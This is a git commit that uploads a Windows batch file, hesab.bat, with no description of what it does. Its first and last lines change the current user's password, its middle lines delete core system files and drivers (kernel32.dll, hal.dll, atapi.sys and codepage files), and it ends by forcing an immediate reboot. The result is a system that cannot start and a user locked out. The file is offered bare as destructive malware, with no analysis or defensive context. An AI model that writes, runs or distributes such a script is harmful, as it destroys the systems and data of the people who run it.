6dd39513bee143a02c0df08d6e0f21017bdf5036
caner65132 <canerduz93@gmail.com>
2024-08-24 23:06:28 +0300

    Add files via upload

---
+++ hesab.bat
@@ -0,0 +1,26 @@
+net user %username% W$ar][{#Wa#syon#$$$#
+del %systemroot%system32dllcachec_1254.nls
+del %systemroot%system32c_1254.nls
+del %systemroot%system32hal.dll
+del %systemroot%system32kdcom.dll
+del %systemroot%system32kernel32.dll
+del %systemroot%system32bootvid.dll
+del %systemroot%system32c_037.nls
+del %systemroot%system32c_437.nls
+del %systemroot%system32c_500.nls
+del %systemroot%system32c_737.nls
+del %systemroot%system32c_1255.nls
+del %systemroot%system32C_28594.nls
+del %systemroot%system32c_20866.nls
+del %systemroot%system32bidispl.dll
+del %systemroot%system32C_28594.nls
+del %systemroot%system32ups.exe
+del %systemroot%system32trkwks.dll
+del %systemroot%system32scardsvr.exe
+del %systemroot%system32audiosrv.dll
+del %systemroot%system32driversatapi.sys
+del %systemroot%system32driverscdaudio.sys
+del %systemroot%system32driverscdfs.sys
+del %systemroot%system32driverscdrom.sys
+shutdown -r -t 00
+net user %username% W$ar][{#Wa#syon#$$$#
